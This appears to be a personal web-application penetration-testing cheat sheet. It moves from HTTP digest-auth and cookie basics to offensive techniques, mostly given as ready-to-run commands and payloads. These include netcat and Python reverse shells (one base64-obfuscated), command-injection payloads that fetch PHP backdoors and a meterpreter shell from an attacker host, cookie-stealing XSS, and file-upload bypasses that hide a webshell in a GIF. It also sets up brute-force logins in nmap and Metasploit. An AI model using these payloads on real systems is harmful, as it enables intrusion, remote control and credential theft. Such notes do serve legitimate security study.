                                             Web applicatio VAPT Tips

=================================================== INFORMATION ===============================================================

HTTP Response Codes

1XX = Informational
2XX = Request successfully
3XX = Redirects
4XX = Client Request Error
5XX = Server side error

RFC 2069

realm = set by server admin
nonce = a random string 
opaque= a random string
uri = you need acces to this 
response = cross match this to authenticate

Hash1= MD5(Username:Relm:Password)
Hash2= MD5(method:URI)
response = MD5(HAsh1:nonce:HAsh2)

Create response string using python
#python
>>>import hashlib
>>>hash1 = hashlib.md5('admin:relm:password').hexdigest()
>>>hash2 = hashlib.md5('GET:URI').hexdigest()
>>>nonce= "enter the nonce"
>>>responce_string = hash1 + ':' + nonce + ':' + hash2
>>>responce = hashlib.md5(response_string).hexdigest()
>>>

RFC 2617



relam = set by server admin
qop = "auth,auth-int"  //QOP quality of protection implimentation
nonce = sent by server
opaque =  same in responce and request 
uri = secured resource location
nc = counter
cnonce = client nonce
response =   //

Hash1= MD5(Username:Relm:Password)
Hash2= MD5(method:URI)
response = MD5(HAsh1:Nonce:NonceCount:Client_nonce:QOP:HAsh2)

Create response string using python
#python
>>>import hashlib
>>>hash1 = hashlib.md5('admin:relm:password').hexdigest()
>>>hash2 = hashlib.md5('GET:URI').hexdigest()
>>>nonce= "enter the nonce"
>>>nonceCount = "enter the nonceCount"
>>>clientNonce = "enter the cnonce"
>>>qop = "auth"
>>>responce_string = hash1 + ':' + nonce + ':' + nonceCount + ':' + clientNonce + ':' + qop +  ':' + hash2
>>>responce = hashlib.md5(response_string).hexdigest()
>>>

Cookies

HTTP is a stateless protocal cookies are used to overcome this
size limit is K

Server end syntax
Set-Cookie: <name>=<value>[; <name>=<value>]...[; expires=<date>][; domain=<domain_name>][; path=<some_path>][; secure][; httponly]
<name>=<value>. //this shoud be any value
expires=<date> // expiray date of the cookie format is DD-MM-YYY HH:MM:SS GMT ,RFC 6265 have Max-age intervel after the cookie recives
domain=<domain_name> // domain for which it is valid
path=<some_path> // path of for the cookie
secure // only be sent over HTTPS connection, Transport layr protction
httponly // cannot be accessed by client side scripts directly, cannot be scripted using js ,XSS mitigation machanisam

Client end syntax
Cookie: <name>=<value> [;<name>=<value>]

Session

Unique identfier or token to identify a user and Session

SSL


===================================================== TOOLS ==================================================================

CURL

# curl -v www.abc.com // to view a website using curl
#  curl -v -X POST http://abc.com/abc/   //curl used post request



NETCAT


# nc www.abc.com 80   //manualy requesting to a webserver in http 1.0
> GET / HTTP/1.0.  //http 1.0
>Host: www.abc.com

# nc www.abc.com 80.    //manualy requesting to a webserver in http 1.1 
> GET / HTTP/1.1  //http 1.1
>Host: www.abc.com
> Connection: close

exploiting command injussion vulnerability to shell on the box

Server

www.abc.com/list.php?path=/; nc -e /bin/bash 192.168.1.10 10000

Client

nc -l -p 1000 -vvv



PYTHON

python shell

> Python -c “exec(\”import socket, subprocess;s = socket.socket();s.connect((‘IP_ADDRESS’,port))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\”)”

>>> shell = "import socket, subprocess;s = socket.socket();s.connect(('192.168.1.1',10000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())".encode('base64')
>>> shell
'aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\nJzE5Mi4xNjguMS4xJywxMDAwMCkpCndoaWxlIDE6IHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMu\ncmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1\nYnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQu\ncmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=\n'
>>> shell.decode('base64')
"import socket, subprocess;s = socket.socket();s.connect(('192.168.1.1',10000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"
>>> python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\nJzE5Mi4xNjguMS4xJywxMDAwMCkpCndoaWxlIDE6IHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMu\ncmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1\nYnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQu\ncmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=\n'.decode('base64'))"




NMAP

Script location /usr/share/namp/scripts/
1) http option scaning
# nmap --script=http-methods.nse --script-args=http-methods.retest=1 (ip/Host_details) -n -p 80. //test options indudaly 
2) Http bruteforce
#namp -p 80 --scripthttp-brute --script-args 'http-brute.hostname={host name},http-brute.method=POST,http-brute.path={path},userdb={username list file},passdb={password list file}' -v {hostname} -n //brutefore web form using nmap
#

METASPLOIT

search "module_name" //you can search modules in metasploit

1) http options scaning
# msfconsole 
msf> set RHOSTS (Host_details)
msf> use auxiliary/scanner/http/options
msf>run //it will show the options availble on RHOSTS
2) http bruteforce
# msfconsole 
msf> use auxiliary/scanner/http/http_login
msf> set RHOSTS {host_name}
msf> set AUTH_URI {uri}
msf> set BLANK_PASSWORDS fals
msf> set PASS_FILE {password_file}
msf> set REQUESTTYPE POST
msf> set STOP_ON_SUCC?ESS true
msf> set THREADS 20
msf> set USERNAME admin         //you can use USER_FILE insted of this
msf> set VHOST {hostname}
msf>set USER_AS_PASS false 
msf> set USERPASS_FILE ''
msf> set USER_FILE ''
msf> run




WIRESHARK


TCPXTRACT
capture and extract files from a http traffic
# tcpxtract -d {interface} -o {directory}


=============================================== METHODS =====================================================================
INJECTION attacks

Frontend (client)
- Rendering attack => Html injection attck
- Code execution => JS injection (XSS)

Backend (Server)
-  Command injection
   * SQL injection ...etc

Html injection
* user input not sanitized
* Malicious inputs consisits of HTML injected in to page
* Render page as per attackers choice to victim 

Eg: not sanitized code

#cat a.php
<html>
<body>
  welcome
  <?php
    echo $_REQUEST['nickname'];
    ?>
    !
</body>
</html>

how to inject code here

# http://localhost/a.php?nichname=<b>Test</b>Please click on this link<a href="http://xyz.com"> Login Here.  //// You can create your own attack vector here

Injection inside tag attribute

inject code in to form or form elements

Eg: not sanitized code

#cat b.php
<html>

<body>

	<b>Welcome Guest! Please login</b>

	<br>
 	<form action='/'>
		<input type="hidden" name="sessionid" value="<?php echo $_REQUEST['sid']; ?>">
		Username: <input type="text" name="username"><br>
		Password: <input type="password" name="pass"><br>
		<input type="submit" value="Login">
	</form>


</body>

</html>

# http://localhost/a.php?sid=<b>Test</b>Please click on this link<a href="http://xyz.com"> Login Here.  //// You can create your own attack vector here

Xml Http Request (XHR)

HTML Injection Bypass filter

The code session looks like below
<input type="text" value="" class="input-block-level" placeholder="Email address" name="email">

in text box if you enter value it will assign in to value so you can enter payload there 
eg: sample" onmouseover="alert('xss');

The above payload will expand the code to below
<input type="text" value="sample" onmouseover="alert('xss');" class="input-block-level" placeholder="Email address" name="email">


# COMMAND Injection Attack

If user inputs are not sanitized attacker can run multiple commands piggypack on existing one

Vulnerable code

1) a.php

<html>

<body>

	<b>File in path are: </b><br><pre>
	<?php 

		$cmd = "ls -alh ".$_REQUEST['path'];
		passthru($cmd);

	?></pre>
</body>

</html>

attack payload

http://localhost/a.php?path=/tmp/;nc -l -p 444 -e /bin/bash;


2) b.php
<html>

<body>

	<b>File in path are: </b><br><pre>
	<?php 

		$cmd = "ls -alh ".str_replace(';', ' ', $_REQUEST['path']);
		passthru($cmd);

	?></pre>
</body>

</html>

attack payload

http://localhost/b.php?path=/tmp/ | nc -l -p 444 -e /bin/bash


3) c.php (Secure code)

<html>

<body>

	<b>File in path are: </b><br><pre>
	<?php 

		$cmd = "ls -alh ".escapeshellarg($_REQUEST['path']);
		passthru($cmd);

	?></pre>
</body>

</html>

Web to shell on the server

exploitation using command injection vulnerability(web root directory is writable)

Payload
http://localhost/b.php?path=/tmp/ |wget http://ip/php-backdoor.php (the backdoor is available on kali /usr/share/webshells/php)

exploit 
http://localhost/php-backdoor.php //run waht you want

PHP meterpreter

Genrate php meterpreter payload using msfvenom
> msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_machine -f raw > php-meter.php (remove guard bit after open the file)

exploitation using command injection vulnerability(web root directory is writable)

Payload
http://localhost/b.php?path=/tmp/ |wget -O /tmp/php-meter.php http://ip/php-meter.php (web root is not writable. the backdoor is available on kali /usr/share/webshells/php)

in metasploit shell

msf>use exploit/multi/handler
msf exploit (handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD php/meterpreter/reverse_tcp
msf exploit (handler) > set LHOST attacker_IP
LHOST attacker_IP
msf exploit (handler) >exploit

exploit 
http://localhost/b.php?path=/tmp; php -f /tmp/php-meter.php;

you can get session on meterpretter

# XSS

Basic test payload (enter in text box)
"><h1>Hello</h1><!--
"><script>alert(document.cookie)</script><!--

chrome has xss protection builtin, you can see the error in javascript console

Type1 XSS persisitant (we can inject the xss code)

XSS with event handlers

payload

abc" onmouseover=alert("XSS")" //enter this in text field you can use this severl places

Dom based XSS

Payload
http://localhost/dom?statement=alert(document.cookie)


File upload vulnerability

change content-type using intercept proxy(Burp suite/ZAP) and upload the shell.

How to defet blacklist in php

change content-type using intercept proxy(Burp suite/ZAP) and upload the shell.
or change extension .php to .PHP and upload the shell you cant execute the file so upload .htaccess file also
cat .htaccess
AddType application/x-httpd-php PHP // insted of PHP you can give any extension it will execute the script as php

EVIDE getimagesize() check in php

Server should support double extension you can inject code using gifsccle

> strings a.gif
GIF89a
*p\p
D$
> tr '\n' ' ' < simple-backdoor.php //you can copy this shell from php shell directory
> gifsicle --comment "` tr '\n' ' ' < simple-backdoor.php `" <action_back.gif> action_back.php.gif. // upload the file 

exploit 
http://localhost/uploads/action_back.php.gif?cmd=ls+/tmp
 

Null Byte Injection



=============================================== REFERENCES =====================================================================


pauldotcom.com
pentestmonkey.net






